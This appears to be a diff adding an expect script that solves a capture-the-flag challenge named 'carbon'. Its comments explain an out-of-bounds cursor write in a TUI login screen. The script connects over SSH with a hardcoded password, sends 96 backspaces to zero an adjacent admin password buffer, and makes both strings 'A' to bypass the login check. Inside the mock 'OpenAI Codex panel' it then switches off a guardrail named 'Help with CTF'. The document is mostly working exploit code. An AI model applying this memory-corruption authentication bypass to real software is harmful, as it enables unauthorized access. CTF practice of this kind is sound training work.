@@ -1,0 +1,96 @@
+#!/usr/bin/expect -f
+# carbon — pwn the OpenAI Codex panel.
+#
+# Vuln: field_insert_char / field_backspace_char don't bound the cursor.
+# Backspace from password field with cursor=0 decrements to -1..-96,
+# writing 0 at buf[cursor] each step. password (0x4083e0) is 96 bytes
+# above admin_password (0x408380), so 96 backspaces zero admin_password.
+# Then a single 'A' typed at cursor=-96 writes 'A' into admin_password[0]
+# without placing a null terminator (the null branch is skipped while
+# cursor < 0). Right-arrow ×95 walks the cursor back to 0 without writing,
+# and a final 'A' at cursor=0 sets password[0]='A' with the regular null
+# terminator. strcmp(password, admin_password) == strcmp("A","A") == 0.
+#
+# After login: G → guardrails, Down ×5 to cursor on "Help with CTF",
+# Space to toggle off, D → dashboard. Carbon metric converges below
+# 130 within ~10 s and the FLAG: line appears.
+
+set timeout 60
+log_user 1
+
+spawn ssh -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null \
+    carbon@carbon-qm6k0jjg.alfactf.ru
+
+expect {
+    "password:" { send "yHEfniGdn8lQKYZ5PdekgA\r" }
+    timeout { puts "TIMEOUT ssh"; exit 1 }
+}
+
+# Wait for the TUI to draw the login screen.
+expect {
+    -re "Sign in|Password|Login|Session" { }
+    timeout { puts "TIMEOUT login screen"; exit 1 }
+}
+sleep 1
+
+# 1) username = "sam_altman"  (active_field=0 = username by default)
+send "sam_altman"
+sleep 0
+# 2) Tab → password field
+send "\t"
+sleep 0
+
+# 3) Backspace ×96 → cursor=-96, zeros [admin_password..password)
+for {set i 0} {$i < 96} {incr i} {
+    send "\x7f"
+}
+sleep 0
+
+# 4) Type 'A' → admin_password[0]='A', cursor=-95 (no null term)
+send "A"
+sleep 0
+
+# 5) Right arrow ×95 → cursor walks to 0 without writing
+for {set i 0} {$i < 95} {incr i} {
+    send "\x1b\[C"
+}
+sleep 0
+
+# 6) Type 'A' → password[0]='A', cursor=1, password[1]=0
+send "A"
+sleep 1
+
+# 7) Enter → submit_login
+send "\r"
+
+# Wait for dashboard
+expect {
+    -re "Dashboard|Guardrails|active users|carbon" { }
+    timeout { puts "TIMEOUT dashboard"; exit 1 }
+}
+sleep 1
+
+# G → guardrails screen
+send "g"
+sleep 1
+
+# Down ×5 → cursor on guardrail #5 ("Help with CTF")
+for {set i 0} {$i < 5} {incr i} {
+    send "\x1b\[B"
+}
+sleep 0
+
+# Space → toggle off
+send " "
+sleep 1
+
+# D → back to dashboard
+send "d"
+
+# Sit on the dashboard while load_factor converges and carbon drops < 130.
+# update_metric_model fires every ~250ms, ~0.24 EMA, so converges in a few s.
+sleep 30
+
+# Quit cleanly: Ctrl+Q
+send "\x11"
+expect eof
